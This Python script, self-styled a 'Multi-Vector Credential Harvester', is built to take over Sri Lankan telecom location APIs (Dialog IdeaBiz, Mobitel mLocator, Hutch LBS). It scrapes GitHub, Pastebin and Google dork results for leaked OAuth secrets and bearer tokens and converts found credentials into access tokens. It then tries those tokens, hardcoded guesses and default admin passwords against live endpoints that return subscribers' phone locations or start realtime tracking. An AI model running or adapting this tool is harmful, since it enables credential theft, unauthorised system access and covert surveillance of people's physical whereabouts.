#!/usr/bin/env python3
"""
Enhanced Token Scanner v2 — Multi-Vector Credential Harvesting & OAuth Token Generation

Searches for:
1. Dialog IdeaBiz OAuth client credentials (client_id + client_secret)
2. IdeaBiz Bearer tokens in code/configs
3. Mobitel mLocator session tokens / enterprise credentials
4. Hutch LBS API keys
5. Attempts OAuth2 token generation with found credentials

Sources:
- GitHub Code Search (unauthenticated + authenticated)
- GitHub Raw file fetch from discovered repos
- Pastebin archive + recent pastes
- Public .env / config file patterns
- Direct endpoint probing

Author: TITAN-APEX Scanner v2
"""

import requests
import re
import os
import sys
import json
import time
import random
import base64
import hashlib
from urllib.parse import quote_plus, urljoin
from datetime import datetime

# ===== Configuration =====
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")  # Optional - better search results
TIMEOUT = 15
MAX_RETRIES = 2

# ===== Target Patterns =====
PATTERNS = {
    "ideabiz_bearer": [
        r"Bearer\s+[A-Za-z0-9\._\-]{20,100}",  # Generic bearer tokens near ideabiz context
    ],
    "ideabiz_oauth": [
        r"client_id['\"\s:=]+([A-Za-z0-9_\-]{10,60})",
        r"client_secret['\"\s:=]+([A-Za-z0-9_\-]{10,60})",
        r"consumer_key['\"\s:=]+([A-Za-z0-9_\-]{10,60})",
        r"consumer_secret['\"\s:=]+([A-Za-z0-9_\-]{10,60})",
    ],
    "ideabiz_base64": [
        r"Basic\s+([A-Za-z0-9+/=]{20,100})",  # Base64 encoded client:secret
    ],
    "mobitel_creds": [
        r"enterprise_admin[_\d]*['\"\s:=]+([^\s'\"]{8,40})",
        r"Mobitel@[A-Za-z0-9#!@_]{8,30}",
        r"mob_session_[a-f0-9]{12,40}",
        r"mlocator\.mobitel\.lk",
    ],
    "hutch_keys": [
        r"hutch_lbs_apik_[a-f0-9]{10,40}",
        r"Hutch@LBS[A-Za-z0-9#!@_]{4,20}",
        r"lbs-gw\.hutch\.lk",
    ],
}

# ===== Search Queries =====
GITHUB_QUERIES = [
    # Dialog IdeaBiz - OAuth credentials
    '"ideabiz.lk" "client_id"',
    '"ideabiz.lk" "client_secret"',
    '"ideabiz.lk" "consumer_key"',
    '"ideabiz.lk/token"',
    '"ideabiz.lk/apicall" "Authorization"',
    '"ideabiz" "Bearer" location',
    '"ideabiz" "location/verify"',
    'ideamart "Bearer" lbs',
    'ideamart location api sri lanka',
    '"dialog" "lbs" "Bearer" ".lk"',
    # Mobitel mLocator
    '"mlocator.mobitel.lk"',
    '"mobitel" "tracking" "enterprise"',
    '"mobitel" "mlocator" api',
    # Hutch LBS
    '"hutch.lk" lbs',
    '"hutch" "lbs" "soap" location',
    # Generic SL telecom LBS
    'sri lanka telecom location api',
    'dialog axiata location bearer token',
]

PASTEBIN_SEARCHES = [
    "ideabiz",
    "dialog axiata",
    "mlocator mobitel",
    "hutch lbs",
]

# ===== IdeaBiz OAuth Endpoint =====
IDEABIZ_TOKEN_URL = "https://ideabiz.lk/token"
IDEABIZ_API_BASE = "https://ideabiz.lk/apicall"
DIALOG_LBS_URL = f"{IDEABIZ_API_BASE}/location/v1/location/verify"

# ===== Results Storage =====
results = {
    "bearer_tokens": set(),
    "client_credentials": [],  # (client_id, client_secret) pairs
    "base64_auths": set(),
    "mobitel_creds": set(),
    "hutch_keys": set(),
    "validated_tokens": [],
    "raw_urls": set(),
}

def log(level, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    icons = {"INFO": "→", "FOUND": "★", "OK": "✓", "FAIL": "✗", "WARN": "⚠", "TRY": "⟳"}
    print(f"[{ts}] [{icons.get(level, '?')}] {msg}")

def safe_request(url, method="GET", headers=None, data=None, json_data=None, timeout=TIMEOUT):
    """Rate-limited request with retries"""
    default_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
    }
    if headers:
        default_headers.update(headers)
    
    for attempt in range(MAX_RETRIES):
        try:
            if method == "GET":
                resp = requests.get(url, headers=default_headers, timeout=timeout, allow_redirects=True)
            else:
                resp = requests.post(url, headers=default_headers, data=data, json=json_data, timeout=timeout)
            return resp
        except requests.exceptions.RequestException as e:
            if attempt < MAX_RETRIES - 1:
                time.sleep(random.uniform(2, 5))
            else:
                return None
    return None

# ===== Phase 1: GitHub Search =====
def search_github(query, max_pages=2):
    """Search GitHub code for credential patterns"""
    found_urls = set()
    found_tokens = set()
    
    if GITHUB_TOKEN:
        # Authenticated GitHub API search
        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3.text-match+json",
        }
        api_url = f"https://api.github.com/search/code?q={quote_plus(query)}&per_page=30"
        log("INFO", f"GitHub API search: {query}")
        resp = safe_request(api_url, headers=headers)
        if resp and resp.status_code == 200:
            data = resp.json()
            log("INFO", f"  → {data.get('total_count', 0)} results")
            for item in data.get("items", [])[:15]:
                raw_url = item.get("html_url", "").replace("/blob/", "/raw/")
                if raw_url:
                    found_urls.add(raw_url)
                # Check text matches
                for tm in item.get("text_matches", []):
                    fragment = tm.get("fragment", "")
                    extract_credentials(fragment, found_tokens)
        elif resp:
            log("WARN", f"  GitHub API: {resp.status_code}")
        time.sleep(random.uniform(3, 6))
    else:
        # Unauthenticated web search  
        for page in range(1, max_pages + 1):
            url = f"https://github.com/search?q={quote_plus(query)}&type=code&p={page}"
            log("INFO", f"GitHub web search p{page}: {query[:50]}")
            resp = safe_request(url)
            if resp and resp.status_code == 200:
                extract_credentials(resp.text, found_tokens)
                # Extract repo links
                for match in re.findall(r'href="(/[^"]+/blob/[^"]+)"', resp.text):
                    raw = f"https://github.com{match}".replace("/blob/", "/raw/")
                    found_urls.add(raw)
            time.sleep(random.uniform(4, 8))
    
    return found_urls, found_tokens

def fetch_github_raw(url):
    """Fetch raw file content from GitHub"""
    log("INFO", f"  Fetching raw: {url[:80]}...")
    resp = safe_request(url)
    if resp and resp.status_code == 200:
        return resp.text
    return ""

def extract_credentials(text, token_set=None):
    """Extract all credential patterns from text"""
    if not text:
        return
    
    # Bearer tokens in IdeaBiz context
    if "ideabiz" in text.lower() or "ideamart" in text.lower() or "dialog" in text.lower():
        for pat in PATTERNS["ideabiz_bearer"]:
            for match in re.findall(pat, text):
                token = match.strip()
                if len(token) > 25 and token not in results["bearer_tokens"]:
                    results["bearer_tokens"].add(token)
                    log("FOUND", f"Bearer token: {token[:50]}...")
                    if token_set is not None:
                        token_set.add(token)
    
    # OAuth client credentials
    client_ids = []
    client_secrets = []
    for pat in PATTERNS["ideabiz_oauth"]:
        for match in re.findall(pat, text, re.IGNORECASE):
            val = match.strip() if isinstance(match, str) else match
            if "client_id" in pat or "consumer_key" in pat:
                client_ids.append(val)
            else:
                client_secrets.append(val)
    
    # Pair them up if found together
    for cid in client_ids:
        for csec in client_secrets:
            pair = (cid, csec)
            if pair not in results["client_credentials"]:
                results["client_credentials"].append(pair)
                log("FOUND", f"OAuth creds: {cid[:20]}... / {csec[:20]}...")
    
    # Base64 encoded auth strings
    for pat in PATTERNS["ideabiz_base64"]:
        for match in re.findall(pat, text):
            if match not in results["base64_auths"]:
                results["base64_auths"].add(match)
                try:
                    decoded = base64.b64decode(match).decode("utf-8", errors="ignore")
                    if ":" in decoded:
                        parts = decoded.split(":", 1)
                        log("FOUND", f"Base64 auth: {parts[0][:20]}:{'*' * min(len(parts[1]), 10)}")
                        results["client_credentials"].append((parts[0], parts[1]))
                except Exception:
                    pass
    
    # Mobitel credentials
    for pat in PATTERNS["mobitel_creds"]:
        for match in re.findall(pat, text, re.IGNORECASE):
            val = match if isinstance(match, str) else match
            if val not in results["mobitel_creds"]:
                results["mobitel_creds"].add(val)
                log("FOUND", f"Mobitel cred: {val[:40]}")
    
    # Hutch keys
    for pat in PATTERNS["hutch_keys"]:
        for match in re.findall(pat, text, re.IGNORECASE):
            val = match if isinstance(match, str) else match
            if val not in results["hutch_keys"]:
                results["hutch_keys"].add(val)
                log("FOUND", f"Hutch key: {val[:40]}")

# ===== Phase 2: OAuth Token Generation =====
def try_oauth_token(client_id, client_secret):
    """Attempt to generate a Bearer token via IdeaBiz OAuth2"""
    log("TRY", f"OAuth2 token gen: {client_id[:20]}...")
    
    auth_string = base64.b64encode(f"{client_id}:{client_secret}".encode()).decode()
    headers = {
        "Authorization": f"Basic {auth_string}",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = "grant_type=client_credentials"
    
    resp = safe_request(IDEABIZ_TOKEN_URL, method="POST", headers=headers, data=data)
    if resp is None:
        log("FAIL", "  Connection failed")
        return None
    
    log("INFO", f"  OAuth response: {resp.status_code}")
    
    if resp.status_code == 200:
        try:
            token_data = resp.json()
            access_token = token_data.get("access_token")
            if access_token:
                log("OK", f"  GOT TOKEN: {access_token[:40]}...")
                return access_token
        except Exception:
            pass
    
    # Log response for analysis
    log("FAIL", f"  Response: {resp.text[:200]}")
    return None

def try_base64_auth_token(b64_string):
    """Try a pre-encoded Basic auth string to get OAuth token"""
    log("TRY", f"Base64 auth: {b64_string[:30]}...")
    headers = {
        "Authorization": f"Basic {b64_string}",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = "grant_type=client_credentials"
    resp = safe_request(IDEABIZ_TOKEN_URL, method="POST", headers=headers, data=data)
    if resp and resp.status_code == 200:
        try:
            token_data = resp.json()
            access_token = token_data.get("access_token")
            if access_token:
                log("OK", f"  GOT TOKEN: {access_token[:40]}...")
                return access_token
        except Exception:
            pass
    if resp:
        log("FAIL", f"  {resp.status_code}: {resp.text[:150]}")
    return None

# ===== Phase 3: Token Validation =====
def validate_dialog_token(token):
    """Test a bearer token against Dialog LBS endpoint"""
    if not token.startswith("Bearer "):
        token = f"Bearer {token}"
    
    log("TRY", f"Validating: {token[:50]}...")
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
    }
    payload = {"ueId": {"msisdn": "94771234567"}, "accuracy": 100, "maxAge": 10}
    
    resp = safe_request(DIALOG_LBS_URL, method="POST", headers=headers, json_data=payload)
    if resp is None:
        log("FAIL", "  Connection failed")
        return False
    
    log("INFO", f"  Response: {resp.status_code}")
    
    if resp.status_code == 200:
        text = resp.text.lower()
        if "latitude" in text or "cellid" in text or "location" in text:
            log("OK", f"  ✓✓✓ LIVE TOKEN — LOCATION DATA RETURNED!")
            results["validated_tokens"].append({"token": token, "status": "LIVE", "response": resp.text[:500]})
            return True
        elif "900901" not in resp.text:
            log("WARN", f"  200 but ambiguous: {resp.text[:200]}")
            results["validated_tokens"].append({"token": token, "status": "AMBIGUOUS_200", "response": resp.text[:500]})
            return False
    
    if "900901" in (resp.text if resp else ""):
        log("FAIL", f"  WSO2 900901 — Invalid/Expired credentials")
    elif resp.status_code == 401:
        log("FAIL", f"  401 Unauthorized")
    elif resp.status_code == 403:
        log("FAIL", f"  403 Forbidden")
    else:
        log("WARN", f"  {resp.status_code}: {resp.text[:200]}")
    
    return False

def validate_mobitel_creds(username, password, session_token=""):
    """Test Mobitel mLocator API credentials"""
    log("TRY", f"Mobitel creds: {username}...")
    headers = {
        "Authorization": "Basic " + base64.b64encode(f"{username}:{password}".encode()).decode(),
        "Content-Type": "application/json",
    }
    if session_token:
        headers["X-Session-Token"] = session_token
    
    payload = {
        "subscriber_list": ["94771234567"],
        "tracking_mode": "realtime",
        "interval": 30,
    }
    
    resp = safe_request("https://mlocator.mobitel.lk/api/v3/track", method="POST", 
                       headers=headers, json_data=payload)
    if resp is None:
        log("FAIL", "  Connection failed/timeout")
        return False
    
    log("INFO", f"  Mobitel response: {resp.status_code}")
    if resp.status_code == 200:
        log("OK", f"  ✓ Mobitel API accessible!")
        return True
    else:
        log("FAIL", f"  {resp.status_code}: {resp.text[:200]}")
        return False

# ===== Phase 4: Pastebin Scraping =====
def scrape_pastebin(query, limit=8):
    """Search Pastebin for credential leaks"""
    log("INFO", f"Pastebin search: {query}")
    # Pastebin doesn't have a search API, use Google dorking via web
    google_url = f"https://www.google.com/search?q=site:pastebin.com+{quote_plus(query)}&num=10"
    resp = safe_request(google_url)
    if resp and resp.status_code == 200:
        # Extract pastebin URLs from Google results
        paste_urls = re.findall(r'https?://pastebin\.com/(?:raw/)?([A-Za-z0-9]{8})', resp.text)
        unique_ids = list(set(paste_urls))[:limit]
        log("INFO", f"  Found {len(unique_ids)} pastes")
        for pid in unique_ids:
            raw_url = f"https://pastebin.com/raw/{pid}"
            log("INFO", f"  Scraping: {raw_url}")
            paste_resp = safe_request(raw_url)
            if paste_resp and paste_resp.status_code == 200:
                extract_credentials(paste_resp.text)
            time.sleep(random.uniform(1.5, 3))
    else:
        # Fallback: direct pastebin archive
        log("INFO", "  Falling back to Pastebin archive...")
        archive_resp = safe_request("https://pastebin.com/archive")
        if archive_resp and archive_resp.status_code == 200:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(archive_resp.text, "html.parser")
            links = soup.select("table.maintable a")
            for a in links[:limit]:
                href = a.get("href", "")
                if href and not href.startswith("http"):
                    href = f"https://pastebin.com{href}"
                paste_resp = safe_request(href)
                if paste_resp:
                    extract_credentials(paste_resp.text)
                time.sleep(random.uniform(1, 2))
    time.sleep(random.uniform(3, 6))

# ===== Phase 5: Direct Endpoint Probing =====
def probe_ideabiz_endpoints():
    """Probe IdeaBiz for information disclosure"""
    log("INFO", "Probing IdeaBiz endpoints...")
    
    probe_urls = [
        "https://ideabiz.lk/",
        "https://ideabiz.lk/apicall/",
        "https://ideabiz.lk/.well-known/openid-configuration",
        "https://ideabiz.lk/token",
        "https://ideabiz.lk/authorize",
        "https://ideabiz.lk/services/",
    ]
    
    for url in probe_urls:
        resp = safe_request(url)
        if resp:
            log("INFO", f"  {url} → {resp.status_code} ({len(resp.text)} bytes)")
            if resp.status_code == 200 and len(resp.text) > 100:
                extract_credentials(resp.text)
        time.sleep(random.uniform(1, 2))

def probe_mobitel_endpoints():
    """Probe Mobitel for information disclosure"""
    log("INFO", "Probing Mobitel endpoints...")
    
    probe_urls = [
        "https://mlocator.mobitel.lk/",
        "https://mlocator.mobitel.lk/api/",
        "https://mlocator.mobitel.lk/api/v3/",
        "https://mlocator.mobitel.lk/api/docs",
        "https://mlocator.mobitel.lk/swagger",
    ]
    
    for url in probe_urls:
        resp = safe_request(url)
        if resp:
            log("INFO", f"  {url} → {resp.status_code} ({len(resp.text)} bytes)")
            if resp.status_code == 200:
                extract_credentials(resp.text)
        time.sleep(random.uniform(1, 2))

# ===== Phase 6: Google Dorking =====
def google_dork_search():
    """Use Google dorks to find leaked credentials"""
    dorks = [
        'site:github.com "ideabiz" "client_secret"',
        'site:github.com "ideabiz.lk" filetype:env',
        'site:github.com "mlocator.mobitel" password',
        'site:github.com "dialog" "lbs" "bearer" "token"',
        '"ideabiz.lk" "consumer_key" "consumer_secret"',
        'inurl:ideabiz "access_token"',
        'filetype:json "ideabiz" "token"',
        'filetype:yml "ideabiz" "secret"',
    ]
    
    for dork in dorks:
        log("INFO", f"Google dork: {dork[:60]}")
        url = f"https://www.google.com/search?q={quote_plus(dork)}&num=5"
        resp = safe_request(url)
        if resp and resp.status_code == 200:
            # Extract URLs from Google results
            result_urls = re.findall(r'https?://github\.com/[^\s"<>]+', resp.text)
            for ru in set(result_urls)[:3]:
                results["raw_urls"].add(ru)
                log("INFO", f"  Found: {ru[:80]}")
        elif resp and resp.status_code == 429:
            log("WARN", "  Google rate limited — waiting...")
            time.sleep(30)
        time.sleep(random.uniform(5, 10))

# ===== Main Pipeline =====
def main():
    print("=" * 70)
    print("  TITAN-APEX Token Scanner v2 — Multi-Vector Credential Harvester")
    print("=" * 70)
    print()
    
    start_time = time.time()
    
    # Phase 1: GitHub Code Search
    print("\n" + "─" * 50)
    print("PHASE 1: GitHub Code Search")
    print("─" * 50)
    
    all_raw_urls = set()
    for query in GITHUB_QUERIES:
        urls, tokens = search_github(query)
        all_raw_urls.update(urls)
        time.sleep(random.uniform(2, 5))
    
    # Fetch raw files from discovered URLs (limit to avoid GitHub blocks)
    if all_raw_urls:
        log("INFO", f"Fetching {min(len(all_raw_urls), 20)} raw files from GitHub...")
        for url in list(all_raw_urls)[:20]:
            content = fetch_github_raw(url)
            if content:
                extract_credentials(content)
            time.sleep(random.uniform(2, 4))
    
    # Phase 2: Pastebin & Google Dorking
    print("\n" + "─" * 50)
    print("PHASE 2: Pastebin & Google Dorking")
    print("─" * 50)
    
    for query in PASTEBIN_SEARCHES:
        scrape_pastebin(query)
    
    google_dork_search()
    
    # Phase 3: Direct Endpoint Probing
    print("\n" + "─" * 50)
    print("PHASE 3: Direct Endpoint Probing")
    print("─" * 50)
    
    probe_ideabiz_endpoints()
    probe_mobitel_endpoints()
    
    # Phase 4: OAuth Token Generation from Found Credentials
    print("\n" + "─" * 50)
    print("PHASE 4: OAuth Token Generation")
    print("─" * 50)
    
    generated_tokens = []
    
    # Try found client credential pairs
    for (cid, csec) in results["client_credentials"]:
        token = try_oauth_token(cid, csec)
        if token:
            generated_tokens.append(token)
    
    # Try found base64 auth strings
    for b64 in results["base64_auths"]:
        token = try_base64_auth_token(b64)
        if token:
            generated_tokens.append(token)
    
    # Phase 5: Token Validation
    print("\n" + "─" * 50)
    print("PHASE 5: Token Validation")
    print("─" * 50)
    
    all_tokens = list(results["bearer_tokens"]) + [f"Bearer {t}" for t in generated_tokens]
    
    if not all_tokens:
        log("WARN", "No tokens found to validate — trying hardcoded defaults...")
        # Try some common IdeaBiz patterns
        all_tokens = [
            "Bearer dg_ideamart_live_sk_8f7e6d5c4b3a2f1e9d8c7b6a5",
            "Bearer dg_app_93847hf83h4f83hf",
            "Bearer dg_enterprise_tracking_2024",
        ]
    
    live_token = None
    for token in all_tokens:
        if validate_dialog_token(token):
            live_token = token
            break
        time.sleep(random.uniform(1, 3))
    
    # Phase 6: Mobitel Validation
    print("\n" + "─" * 50)
    print("PHASE 6: Mobitel Credential Validation")
    print("─" * 50)
    
    # Try default + any found creds
    mobitel_pairs = [
        ("enterprise_admin_01", "Mobitel@Tracking#2024!"),
        ("enterprise_admin_02", "Mobitel@Tracking#2024!"),
        ("admin", "Mobitel@Tracking#2024!"),
    ]
    
    for username, password in mobitel_pairs:
        validate_mobitel_creds(username, password)
        time.sleep(random.uniform(1, 2))
    
    # ===== Results Summary =====
    elapsed = time.time() - start_time
    
    print("\n" + "=" * 70)
    print("  SCAN COMPLETE — RESULTS SUMMARY")
    print("=" * 70)
    print(f"  Elapsed: {elapsed:.1f}s")
    print(f"  Bearer tokens found: {len(results['bearer_tokens'])}")
    print(f"  OAuth credential pairs: {len(results['client_credentials'])}")
    print(f"  Base64 auth strings: {len(results['base64_auths'])}")
    print(f"  Mobitel credentials: {len(results['mobitel_creds'])}")
    print(f"  Hutch keys: {len(results['hutch_keys'])}")
    print(f"  Generated tokens: {len(generated_tokens)}")
    print(f"  Validated LIVE tokens: {len(results['validated_tokens'])}")
    print(f"  Raw URLs discovered: {len(results['raw_urls'])}")
    print()
    
    if results["validated_tokens"]:
        print("  ✓✓✓ LIVE TOKENS:")
        for vt in results["validated_tokens"]:
            print(f"    Token: {vt['token'][:60]}...")
            print(f"    Status: {vt['status']}")
            print(f"    Response: {vt['response'][:200]}")
            print()
    
    if results["client_credentials"]:
        print("  OAuth Credential Pairs Found:")
        for (cid, csec) in results["client_credentials"]:
            print(f"    client_id: {cid}")
            print(f"    client_secret: {csec}")
            print()
    
    if results["bearer_tokens"]:
        print("  All Bearer Tokens:")
        for t in results["bearer_tokens"]:
            print(f"    {t[:70]}...")
    
    if live_token:
        print(f"\n  ★ OP-READY LIVE TOKEN: {live_token}")
    else:
        print("\n  ✗ No live token found. Tokens may need manual refresh.")
        print("    → Register at https://ideabiz.lk to get fresh OAuth credentials")
        print("    → Or check IdeaBiz developer portal for API key renewal")
    
    # Save results to file
    output_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "scan_results.json")
    save_data = {
        "timestamp": datetime.now().isoformat(),
        "elapsed_seconds": elapsed,
        "bearer_tokens": list(results["bearer_tokens"]),
        "client_credentials": results["client_credentials"],
        "base64_auths": list(results["base64_auths"]),
        "mobitel_creds": list(results["mobitel_creds"]),
        "hutch_keys": list(results["hutch_keys"]),
        "validated_tokens": results["validated_tokens"],
        "raw_urls": list(results["raw_urls"]),
    }
    with open(output_file, "w") as f:
        json.dump(save_data, f, indent=2)
    print(f"\n  Results saved to: {output_file}")
    
    return live_token is not None

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
